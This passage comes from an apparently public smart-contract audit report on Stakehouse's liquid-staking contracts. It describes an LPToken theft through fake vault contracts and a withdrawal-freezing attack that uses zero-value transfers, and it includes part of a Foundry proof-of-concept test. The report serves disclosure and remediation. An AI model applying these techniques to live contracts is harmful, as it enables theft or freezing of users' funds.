_to, uint256) external override {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    function beforeTokenTransfer(address _from, address _to, uint256) external override nonReentrant {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         address syndicate = liquidStakingNetworkManager.syndicate();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         if (syndicate != address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             LPToken token = LPToken(msg.sender);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/328#issuecomment-1329416775\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-21-bringunusedethbackintogiantpool-in-giantmevandfeespool-can-be-used-to-steal-lptokens\" style=\"position:relative;\"><a href=\"#h-21-bringunusedethbackintogiantpool-in-giantmevandfeespool-can-be-used-to-steal-lptokens\" aria-label=\"h 21 bringunusedethbackintogiantpool in giantmevandfeespool can be used to steal lptokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/366\">[H-21] <code>bringUnusedETHBackIntoGiantPool</code> in <code>GiantMevAndFeesPool</code> can be used to steal <code>LPTokens</code></a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/366\">datapunk</a></em></p>\n<p>real <code>LPTokens</code> can be transferred out of <code>GiantMevAndFeesPool</code> through fake <code>_stakingFundsVaults</code> provided by an attacker.\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126</a></p>\n<h3 id=\"proof-of-concept-19\" style=\"position:relative;\"><a href=\"#proof-of-concept-19\" aria-label=\"proof of concept 19 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>bringUnusedETHBackIntoGiantPool</code> takes in <code>_stakingFundsVaults</code>, <code>_oldLPTokens</code>, <code>_newLPTokens</code> and rotate <code>_amounts</code> from old to new tokens. The tokens are thoroughly verified by <code>burnLPForETH</code> in <code>ETHPoolLPFactory</code>.<br>\nHowever, theres is no checking for the validity of <code>_stakingFundsVaults</code>, nor the relationship between <code>LPTokens</code> and <code>_stakingFundsVaults</code>. Therefore, an attacker can create fake contracts for <code>_stakingFundsVaults</code>, with <code>burnLPTokensForETH</code>, that takes <code>LPTokens</code> as parameters. The <code>msg.sender</code> in <code>burnLPTokensForETH</code> is <code>GiantMevAndFeesPool</code>, thus the attacker can transfer <code>LPTokens</code> that belongs to <code>GiantMevAndFeesPool</code> to any addresses it controls.</p>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Always passing liquid staking manager address, checking its real and then requesting either the savETH vault or staking funds vault is a good idea to prove the validity of vaults.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/366#issuecomment-1329404515\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h1 id=\"medium-risk-findings-31\" style=\"position:relative;\"><a href=\"#medium-risk-findings-31\" aria-label=\"medium risk findings 31 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (31)</h1>\n<h2 id=\"m-01-freezing-of-funds---hacker-can-prevent-users-withdraws-in-giant-pools\" style=\"position:relative;\"><a href=\"#m-01-freezing-of-funds---hacker-can-prevent-users-withdraws-in-giant-pools\" aria-label=\"m 01 freezing of funds   hacker can prevent users withdraws in giant pools permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/49\">[M-01] Freezing of funds - Hacker can prevent users withdraws in giant pools</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/49\">0xdeadbeef0x</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/440\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/439\">JTJabba</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/429\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/395\">V_B</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/392\">minhtrng</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/291\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/252\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/215\">hihen</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/138\">Lambda</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/58\">aphak5010</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/41\">HE1M</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L69</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L96\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L96</a></p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>A hacker can prevent users from withdrawing dETH or LPTokens in giant pools.</p>\n<p>This bug causes a revert in:</p>\n<ol>\n<li><code>WithdrawLP</code> - <code>GiantMevAndFeesPool</code></li>\n<li><code>WithdrawLP</code> - <code>GiantSavETHVaultPool</code></li>\n<li><code>WithdrawDETH</code> - <code>GiantSavETHVaultPool</code></li>\n</ol>\n<p>A hacker can prevent a user from receiving dETH when users are eligible and guaranteed to receive it through their stake.</p>\n<p>This causes a liquidity crunch as the only funds that are possible to withdraw are ETH. There is not enough ETH in the giant pools to facilitate a large withdraw as ETH is staked for LPTokens and dETH.</p>\n<p>The giant pools will become insolvent to returning ETH, dETH or vault LPTokens.</p>\n<h3 id=\"proof-of-concept-20\" style=\"position:relative;\"><a href=\"#proof-of-concept-20\" aria-label=\"proof of concept 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Both <code>WithdrawLP</code> and <code>WithdrawDETH</code> act in a similar way:</p>\n<ol>\n<li>loop LPtokens received for withdraw</li>\n<li>Check user has enough Giant LP tokens to burn and pool has enough vault LP to give.</li>\n<li>Check that a day has passed since user has interacted with Giant LP Token</li>\n<li>burn tokens</li>\n<li>send tokens</li>\n</ol>\n<p>Example of <code>WithdrawDETH</code>:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L66</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function withdrawDETH(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address[] calldata _savETHVaults,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LPToken[][] calldata _lpTokens,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[][] calldata _amounts</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ) external {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 numOfVaults = _savETHVaults.length;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults &gt; 0, &quot;Empty arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults == _lpTokens.length, &quot;Inconsistent arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(numOfVaults == _amounts.length, &quot;Inconsistent arrays&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Firstly capture current dETH balance and see how much has been deposited after the loop</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        for (uint256 i; i &lt; numOfVaults; ++i) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            SavETHVault vault = SavETHVault(_savETHVaults[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            for (uint256 j; j &lt; _lpTokens[i].length; ++j) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                LPToken token = _lpTokens[i][j];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                uint256 amount = _amounts[i][j];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                require(vault.isDETHReadyForWithdrawal(address(token)), &quot;dETH is not ready for withdrawal&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                // Giant LP is burned 1:1 with LPs from sub-networks</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                require(lpTokenETH.balanceOf(msg.sender) &gt;= amount, &quot;User does not own enough LP&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                // Burn giant LP from user before sending them dETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                lpTokenETH.burn(msg.sender, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">                emit LPBurnedForDETH(address(token), msg.sender, amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            // Ask</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            vault.burnLPTokens(_lpTokens[i], _amounts[i]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Calculate how much dETH has been received from burning</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this)) - dETHReceivedFromAllSavETHVaults;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Send giant LP holder dETH owed</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        getDETH().transfer(msg.sender, dETHReceivedFromAllSavETHVaults);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>The bug is in <code>_assertUserHasEnoughGiantLPToClaimVaultLP</code> in the last require that checks that a day has passed since the user has interacted with Giant LP Token:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L93</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"65\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(_amount &gt;= MIN_STAKING_AMOUNT, &quot;Invalid amount&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(_token.balanceOf(address(this)) &gt;= _amount, &quot;Pool does not own specified LP&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days &lt; block.timestamp, &quot;Too new&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<p>The condition <code>lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days &#x3C; block.timestamp</code> can be set to fail by the hacker. The hacker  transfers 0 <code>lpTokenETH</code> tokens to  <code>msg.sender</code>. This transfer will update the <code>lastInteractedTimestamp</code> to now.</p>\n<p>The above can be done once a day or on-demand by front-running the withdraw commands.</p>\n<p><code>_afterTokenTransfer</code> in <code>GiantLP.sol</code>:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function _afterTokenTransfer(address _from, address _to, uint256 _amount) internal override {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        lastInteractedTimestamp[_from] = block.timestamp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        lastInteractedTimestamp[_to] = block.timestamp;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        if (address(transferHookProcessor) != address(0)) ITransferHookProcessor(transferHookProcessor).afterTokenTransfer(_from, _to, _amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span></code></pre>\n<h3 id=\"foundry-poc-1\" style=\"position:relative;\"><a href=\"#foundry-poc-1\" aria-label=\"foundry poc 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Foundry POC</h3>\n<p>The POC will show how a hacker prevents a user from receiving dETH although they are eligible to receive it.</p>\n<p>Add the following test to <code>GiantPools.t.sol</code>:<br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/GiantPools.t.sol#L118\">https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/GiantPools.t.sol#L118</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testPreventWithdraw() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Set up users and ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Register BLS key</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Deposit 24 ETH into giant savETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.prank(savETHUser);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantSavETHPool.depositETH{value: 24 ether}(24 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(address(giantSavETHPool).balance, 24 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Deploy 24 ETH from giant LP into savETH pool of LSDN instance</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        bytes[][] memory blsKeysForVaults = new bytes[][](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        uint256[][] memory stakeAmountsForVaults = new uint256[][](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantSavETHPool.batchDepositETHForStaking(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            getAddressArrayFromValues(address(manager.savETHVault())),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            getUint256ArrayFromValues(24 ether),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            blsKeysForVaults,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            stakeAmountsForVaults</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(address(manager.savETHVault()).balance, 24 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Deposit 4 ETH into giant fees and mev</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(feesAndMevUserOne);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(address(giantFeesAndMevPool).balance, 4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.batchDepositETHForStaking(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            getAddressArrayFromValues(address(manager.stakingFundsVault())),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            getUint256ArrayFromValues(4 ether),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            blsKeysForVaults,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">            stakeAmountsForVaults</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Ensure we can stake and mint derivatives</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        stakeAndMintDerivativesSingleKey(blsPubKeyOne);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        IERC20 dETHToken = savETHVault.dETHToken();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(accountFive);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        dETHToken.transfer(address(savETHVault.saveETHRegistry()), 24 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LPToken[] memory tokens = new LPToken[](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        tokens[0] = savETHVault.lpTokenForKnot(blsPubKeyOne);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        LPToken[][] memory allTokens = new LPToken[][](1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        allTokens[0] = tokens;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // User will not have any dETH to start</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        assertEq(dETHToken.balanceOf(savETHUser), 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Warp ahead -&gt; savETHUser eligible to dETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.warp(block.timestamp + 2 days);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Send 0 tokens to savETHUser so he cannot withdrawDETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address hacker = address(0xdeadbeef);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        